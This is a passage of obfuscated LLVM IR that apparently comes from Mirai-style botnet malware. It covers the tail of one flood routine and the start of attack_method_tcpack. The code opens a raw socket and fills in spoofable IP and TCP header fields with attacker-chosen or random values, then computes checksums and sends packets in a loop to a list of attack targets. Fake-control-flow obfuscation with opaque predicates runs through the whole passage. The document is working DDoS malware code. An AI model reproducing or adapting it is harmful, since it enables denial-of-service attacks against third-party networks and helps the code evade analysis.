  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %379, i64 %381
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %382, i32 0, i32 1
  %384 = load i32, i32* %383, align 4
  %385 = call i32 @ntohl(i32 %384) #7
  %386 = call i32 @rand_next()
  %387 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %388 = load i32, i32* %9, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 2
  %392 = load i8, i8* %391, align 4
  %393 = zext i8 %392 to i32
  %394 = lshr i32 %386, %393
  %395 = add i32 %385, %394
  %396 = call i32 @htonl(i32 %395) #7
  %397 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 9
  store i32 %396, i32* %398, align 4
  br label %399

; <label>:399:                                    ; preds = %378, %359
  %400 = load i32, i32* %26, align 4
  %401 = icmp eq i32 %400, -1
  br i1 %401, label %402, label %422

; <label>:402:                                    ; preds = %399
  %403 = load i32, i32* @x.25
  %404 = load i32, i32* @y.26
  %405 = sub i32 %403, 1
  %406 = mul i32 %403, %405
  %407 = urem i32 %406, 2
  %408 = icmp eq i32 %407, 0
  %409 = icmp slt i32 %404, 10
  %410 = or i1 %408, %409
  br i1 %410, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %402
  %411 = call i32 @rand_next()
  %412 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 8
  store i32 %411, i32* %413, align 4
  %414 = load i32, i32* @x.25
  %415 = load i32, i32* @y.26
  %416 = sub i32 %414, 1
  %417 = mul i32 %414, %416
  %418 = urem i32 %417, 2
  %419 = icmp eq i32 %418, 0
  %420 = icmp slt i32 %415, 10
  %421 = or i1 %419, %420
  br i1 %421, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %422

; <label>:422:                                    ; preds = %originalBBpart218, %399
  %423 = load i16, i16* %13, align 2
  %424 = zext i16 %423 to i32
  %425 = icmp eq i32 %424, 65535
  br i1 %425, label %426, label %448

; <label>:426:                                    ; preds = %422
  %427 = load i32, i32* @x.25
  %428 = load i32, i32* @y.26
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %426
  %435 = call i32 @rand_next()
  %436 = and i32 %435, 65535
  %437 = trunc i32 %436 to i16
  %438 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %439 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %438, i32 0, i32 3
  store i16 %437, i16* %439, align 4
  %440 = load i32, i32* @x.25
  %441 = load i32, i32* @y.26
  %442 = sub i32 %440, 1
  %443 = mul i32 %440, %442
  %444 = urem i32 %443, 2
  %445 = icmp eq i32 %444, 0
  %446 = icmp slt i32 %441, 10
  %447 = or i1 %445, %446
  br i1 %447, label %originalBBpart235, label %originalBB20alteredBB

originalBBpart235:                                ; preds = %originalBB20
  br label %448

; <label>:448:                                    ; preds = %originalBBpart235, %422
  %449 = load i16, i16* %16, align 2
  %450 = zext i16 %449 to i32
  %451 = icmp eq i32 %450, 65535
  br i1 %451, label %452, label %458

; <label>:452:                                    ; preds = %448
  %453 = call i32 @rand_next()
  %454 = and i32 %453, 65535
  %455 = trunc i32 %454 to i16
  %456 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %457 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %456, i32 0, i32 0
  store i16 %455, i16* %457, align 4
  br label %458

; <label>:458:                                    ; preds = %452, %448
  %459 = load i16, i16* %17, align 2
  %460 = zext i16 %459 to i32
  %461 = icmp eq i32 %460, 65535
  br i1 %461, label %462, label %468

; <label>:462:                                    ; preds = %458
  %463 = call i32 @rand_next()
  %464 = and i32 %463, 65535
  %465 = trunc i32 %464 to i16
  %466 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 1
  store i16 %465, i16* %467, align 2
  br label %468

; <label>:468:                                    ; preds = %462, %458
  %469 = load i32, i32* %18, align 4
  %470 = icmp eq i32 %469, 65535
  br i1 %470, label %471, label %491

; <label>:471:                                    ; preds = %468
  %472 = load i32, i32* @x.25
  %473 = load i32, i32* @y.26
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %471
  %480 = call i32 @rand_next()
  %481 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %482 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %481, i32 0, i32 2
  store i32 %480, i32* %482, align 4
  %483 = load i32, i32* @x.25
  %484 = load i32, i32* @y.26
  %485 = sub i32 %483, 1
  %486 = mul i32 %483, %485
  %487 = urem i32 %486, 2
  %488 = icmp eq i32 %487, 0
  %489 = icmp slt i32 %484, 10
  %490 = or i1 %488, %489
  br i1 %490, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %491

; <label>:491:                                    ; preds = %originalBBpart239, %468
  %492 = load i32, i32* %19, align 4
  %493 = icmp eq i32 %492, 65535
  br i1 %493, label %494, label %498

; <label>:494:                                    ; preds = %491
  %495 = call i32 @rand_next()
  %496 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 3
  store i32 %495, i32* %497, align 4
  br label %498

; <label>:498:                                    ; preds = %494, %491
  %499 = load i32, i32* @x.25
  %500 = load i32, i32* @y.26
  %501 = sub i32 %499, 1
  %502 = mul i32 %499, %501
  %503 = urem i32 %502, 2
  %504 = icmp eq i32 %503, 0
  %505 = icmp slt i32 %500, 10
  %506 = or i1 %504, %505
  br i1 %506, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %498
  %507 = load i8, i8* %20, align 1
  %508 = icmp ne i8 %507, 0
  %509 = load i32, i32* @x.25
  %510 = load i32, i32* @y.26
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBBpart243, label %originalBB41alteredBB

originalBBpart243:                                ; preds = %originalBB41
  br i1 %508, label %517, label %523

; <label>:517:                                    ; preds = %originalBBpart243
  %518 = call i32 @rand_next()
  %519 = and i32 %518, 65535
  %520 = trunc i32 %519 to i16
  %521 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %522 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %521, i32 0, i32 7
  store i16 %520, i16* %522, align 2
  br label %523

; <label>:523:                                    ; preds = %517, %originalBBpart243
  %524 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %525 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %524, i32 0, i32 7
  store i16 0, i16* %525, align 2
  %526 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %527 = bitcast %struct.iphdr* %526 to i16*
  %528 = call zeroext i16 @checksum_generic(i16* %527, i32 20)
  %529 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %530 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %529, i32 0, i32 7
  store i16 %528, i16* %530, align 2
  %531 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %532 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %531, i32 0, i32 6
  store i16 0, i16* %532, align 4
  %533 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %534 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %535 = bitcast %struct.tcphdr* %534 to i8*
  %536 = call zeroext i16 @htons(i16 zeroext 40) #7
  %537 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %533, i8* %535, i16 zeroext %536, i32 40)
  %538 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 6
  store i16 %537, i16* %539, align 4
  %540 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 1
  %542 = load i16, i16* %541, align 2
  %543 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %544 = load i32, i32* %9, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 0
  %548 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %547, i32 0, i32 1
  store i16 %542, i16* %548, align 2
  %549 = load i32, i32* %10, align 4
  %550 = load i8*, i8** %30, align 8
  %551 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %552 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %553 = load i32, i32* %9, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i64 %554
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i32 0, i32 0
  %557 = bitcast %struct.sockaddr_in* %556 to %struct.sockaddr*
  store %struct.sockaddr* %557, %struct.sockaddr** %551, align 8
  %558 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %559 = load %struct.sockaddr*, %struct.sockaddr** %558, align 8
  %560 = call i64 @sendto(i32 %549, i8* %550, i64 60, i32 16384, %struct.sockaddr* %559, i32 16)
  br label %561

; <label>:561:                                    ; preds = %523
  %562 = load i32, i32* @x.25
  %563 = load i32, i32* @y.26
  %564 = sub i32 %562, 1
  %565 = mul i32 %562, %564
  %566 = urem i32 %565, 2
  %567 = icmp eq i32 %566, 0
  %568 = icmp slt i32 %563, 10
  %569 = or i1 %567, %568
  br i1 %569, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %561
  %570 = load i32, i32* %9, align 4
  %571 = add nsw i32 %570, 1
  store i32 %571, i32* %9, align 4
  %572 = load i32, i32* @x.25
  %573 = load i32, i32* @y.26
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBBpart250, label %originalBB45alteredBB

originalBBpart250:                                ; preds = %originalBB45
  br label %354

; <label>:580:                                    ; preds = %354
  br label %353

; <label>:581:                                    ; preds = %136, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %98
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %115
  store i32 1, i32* %9, align 4
  %582 = load i32, i32* %10, align 4
  %583 = bitcast i32* %9 to i8*
  %584 = call i32 @setsockopt(i32 %582, i32 0, i32 3, i8* %583, i32 4) #6
  %585 = icmp eq i32 %584, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %317
  %586 = load i32, i32* %9, align 4
  %_ = sub i32 0, %586
  %gen = add i32 %_, 1
  %_7 = sub i32 0, %586
  %gen8 = add i32 %_7, 1
  %587 = add nsw i32 %586, 1
  store i32 %587, i32* %9, align 4
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %336
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %402
  %588 = call i32 @rand_next()
  %589 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %590 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %589, i32 0, i32 8
  store i32 %588, i32* %590, align 4
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %426
  %591 = call i32 @rand_next()
  %_21 = sub i32 %591, 65535
  %gen22 = mul i32 %_21, 65535
  %_23 = sub i32 %591, 65535
  %gen24 = mul i32 %_23, 65535
  %_25 = sub i32 0, %591
  %gen26 = add i32 %_25, 65535
  %_27 = sub i32 %591, 65535
  %gen28 = mul i32 %_27, 65535
  %_29 = sub i32 0, %591
  %gen30 = add i32 %_29, 65535
  %_31 = shl i32 %591, 65535
  %_32 = sub i32 %591, 65535
  %gen33 = mul i32 %_32, 65535
  %592 = and i32 %591, 65535
  %593 = trunc i32 %592 to i16
  %594 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %595 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %594, i32 0, i32 3
  store i16 %593, i16* %595, align 4
  br label %originalBB20

originalBB37alteredBB:                            ; preds = %originalBB37, %471
  %596 = call i32 @rand_next()
  %597 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 2
  store i32 %596, i32* %598, align 4
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %498
  %599 = load i8, i8* %20, align 1
  %600 = icmp ne i8 %599, 0
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %561
  %601 = load i32, i32* %9, align 4
  %_46 = sub i32 0, %601
  %gen47 = add i32 %_46, 1
  %_48 = shl i32 %601, 1
  %602 = add nsw i32 %601, 1
  store i32 %602, i32* %9, align 4
  br label %originalBB45
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.tcphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.tcphdr*, align 8
  %35 = alloca i8*, align 8
  %36 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %37 = load i8, i8* %5, align 1
  %38 = zext i8 %37 to i64
  %39 = call noalias i8* @calloc(i64 %38, i64 8) #6
  %40 = bitcast i8* %39 to i8**
  store i8** %40, i8*** %11, align 8
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 2, i32 0)
  %44 = trunc i32 %43 to i8
  store i8 %44, i8* %12, align 1
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 3, i32 65535)
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* %13, align 2
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 4, i32 64)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %14, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 5, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %15, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 6, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %16, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 7, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %17, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 17, i32 65535)
  store i32 %67, i32* %18, align 4
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 18, i32 65535)
  store i32 %70, i32* %19, align 4
  %71 = load i8, i8* %7, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 11, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %20, align 1
  %75 = load i8, i8* %7, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 12, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 13, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %7, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 14, i32 0)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %23, align 1
  %87 = load i8, i8* %7, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 15, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %24, align 1
  %91 = load i8, i8* %7, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 16, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %25, align 1
  %95 = load i8, i8* %7, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 0, i32 512)
  store i32 %97, i32* %26, align 4
  %98 = load i8, i8* %7, align 1
  %99 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %100 = call i32 @attack_get_opt_int(i8 zeroext %98, %struct.attack_option* %99, i8 zeroext 1, i32 1)
  %101 = trunc i32 %100 to i8
  store i8 %101, i8* %27, align 1
  %102 = load i8, i8* %7, align 1
  %103 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %104 = load i32, i32* @LOCAL_ADDR, align 4
  %105 = call i32 @attack_get_opt_ip(i8 zeroext %102, %struct.attack_option* %103, i8 zeroext 25, i32 %104)
  store i32 %105, i32* %28, align 4
  %106 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %106, i32* %10, align 4
  %107 = icmp eq i32 %106, -1
  br i1 %107, label %108, label %109

; <label>:108:                                    ; preds = %4
  br label %648

; <label>:109:                                    ; preds = %4
  %110 = load i32, i32* @x.27
  %111 = load i32, i32* @y.28
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %109
  store i32 1, i32* %9, align 4
  %118 = load i32, i32* %10, align 4
  %119 = bitcast i32* %9 to i8*
  %120 = call i32 @setsockopt(i32 %118, i32 0, i32 3, i8* %119, i32 4) #6
  %121 = icmp eq i32 %120, -1
  %122 = load i32, i32* @x.27
  %123 = load i32, i32* @y.28
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %121, label %130, label %133

; <label>:130:                                    ; preds = %originalBBpart2
  %131 = load i32, i32* %10, align 4
  %132 = call i32 @close(i32 %131)
  br label %648

; <label>:133:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %134

; <label>:134:                                    ; preds = %originalBBpart2213, %133
  %135 = load i32, i32* %9, align 4
  %136 = load i8, i8* %5, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp slt i32 %135, %137
  br i1 %138, label %139, label %360

; <label>:139:                                    ; preds = %134
  %140 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %141 = load i8**, i8*** %11, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8*, i8** %141, i64 %143
  store i8* %140, i8** %144, align 8
  %145 = load i8**, i8*** %11, align 8
  %146 = load i32, i32* %9, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8*, i8** %145, i64 %147
  %149 = load i8*, i8** %148, align 8
  %150 = bitcast i8* %149 to %struct.iphdr*
  store %struct.iphdr* %150, %struct.iphdr** %29, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i64 1
  %153 = bitcast %struct.iphdr* %152 to %struct.tcphdr*
  store %struct.tcphdr* %153, %struct.tcphdr** %30, align 8
  %154 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i64 1
  %156 = bitcast %struct.tcphdr* %155 to i8*
  store i8* %156, i8** %31, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, 15
  %161 = or i8 %160, 64
  store i8 %161, i8* %158, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = load i8, i8* %163, align 4
  %165 = and i8 %164, -16
  %166 = or i8 %165, 5
  store i8 %166, i8* %163, align 4
  %167 = load i8, i8* %12, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %26, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 40, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %13, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %14, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %15, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %190

; <label>:186:                                    ; preds = %139
  %187 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %188 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 4
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %186, %139
  %191 = load i32, i32* @x.27
  %192 = load i32, i32* @y.28
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %190
  %199 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 6
  store i8 6, i8* %200, align 1
  %201 = load i32, i32* %28, align 4
  %202 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 8
  store i32 %201, i32* %203, align 4
  %204 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %204, i64 %206
  %208 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i32 0, i32 1
  %209 = load i32, i32* %208, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 9
  store i32 %209, i32* %211, align 4
  %212 = load i16, i16* %16, align 2
  %213 = call zeroext i16 @htons(i16 zeroext %212) #7
  %214 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  store i16 %213, i16* %215, align 4
  %216 = load i16, i16* %17, align 2
  %217 = call zeroext i16 @htons(i16 zeroext %216) #7
  %218 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %219 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %218, i32 0, i32 1
  store i16 %217, i16* %219, align 2
  %220 = load i32, i32* %18, align 4
  %221 = trunc i32 %220 to i16
  %222 = call zeroext i16 @htons(i16 zeroext %221) #7
  %223 = zext i16 %222 to i32
  %224 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %225 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %224, i32 0, i32 2
  store i32 %223, i32* %225, align 4
  %226 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 4
  %228 = load i16, i16* %227, align 4
  %229 = and i16 %228, -241
  %230 = or i16 %229, 80
  store i16 %230, i16* %227, align 4
  %231 = load i8, i8* %20, align 1
  %232 = sext i8 %231 to i16
  %233 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %234 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %233, i32 0, i32 4
  %235 = load i16, i16* %234, align 4
  %236 = and i16 %232, 1
  %237 = shl i16 %236, 13
  %238 = and i16 %235, -8193
  %239 = or i16 %238, %237
  store i16 %239, i16* %234, align 4
  %240 = load i8, i8* %21, align 1
  %241 = sext i8 %240 to i16
  %242 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = and i16 %241, 1
  %246 = shl i16 %245, 12
  %247 = and i16 %244, -4097
  %248 = or i16 %247, %246
  store i16 %248, i16* %243, align 4
  %249 = load i8, i8* %22, align 1
  %250 = sext i8 %249 to i16
  %251 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %252 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %251, i32 0, i32 4
  %253 = load i16, i16* %252, align 4
  %254 = and i16 %250, 1
  %255 = shl i16 %254, 11
  %256 = and i16 %253, -2049
  %257 = or i16 %256, %255
  store i16 %257, i16* %252, align 4
  %258 = load i8, i8* %23, align 1
  %259 = sext i8 %258 to i16
  %260 = load %struct.tcphdr*, %struct.tcphdr** %30, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 4
  %262 = load i16, i16* %261, align 4
  %263 = and i16 %259, 1
  %264 = shl i16 %263, 10
  %265 = and i16 %262, -1025
  %266 = or i16 %265, %264
  store i16 %266, i16* %261, align 4
  %267 = load i8, i8* %24, align 1
  %268 = sext i8 %267 to i16
